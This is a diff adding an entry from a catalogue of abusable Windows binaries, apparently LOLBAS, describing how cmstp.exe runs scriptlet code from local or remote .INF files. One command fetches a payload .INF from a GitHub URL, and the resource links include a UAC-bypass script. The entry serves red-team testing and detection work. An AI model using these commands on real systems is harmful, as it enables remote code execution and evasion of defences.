@@ -1,0 +1,46 @@
+---
+Name: 'Cmstp.exe'
+Description: 'Executes code from remote scriptlet'
+Created: '2018-06-12'
+Commands:
+  - Command: 'cmstp.exe /ni /s c:\cmstp\CorpVPN.inf'
+    Description: 'Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.'
+  - Command: 'cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf'
+    Description: 'Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.'
+Windows Binary: true
+Bypasses Default AppLocker Rules: false
+Notes: ''
+MITRE:
+  - ID: 'T1191'
+    Link: 'https://attack.mitre.org/wiki/Technique/T1191'
+Atomic Red Teaming:
+  - Description: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1191/T1191.md'
+    Code: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1191/T1191.inf'
+Full path:
+  - Path: 'C:\Windows\system32\cmstp.exe'
+  - Path: 'C:\Windows\sysWOW64\cmstp.exe'
+Verified on OS:
+  - Windows 10 1803: false
+  - Windows 10 1709: false
+  - Windows 10 1703: false
+  - Windows 10 1607: false
+  - Windows 10 1511: false
+  - Windows 10 1507: false
+  - Windows 8.1: false
+  - Windows 8: false
+  - Windows 7: false
+Resources:
+  - Link: 'https://twitter.com/NickTyrer/status/958450014111633408'
+  - Link: 'https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80'
+  - Link: 'https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e'
+  - Link: 'https://oddvar.moe/2017/08/15/research-on-cmstp-exe/'
+  - Link: 'https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1'
+  - Link: 'https://github.com/hfiref0x/UACME'
+Acknowledgement:
+  - Name: 'Oddvar Moe'
+    TwitterHandle: '@oddvarmoe'
+    Blog: 'https://oddvar.moe'
+  - Name: 'Nick Tyrer'
+    TwitterHandle: '@NickTyrer'
+    Blog: ''
+---
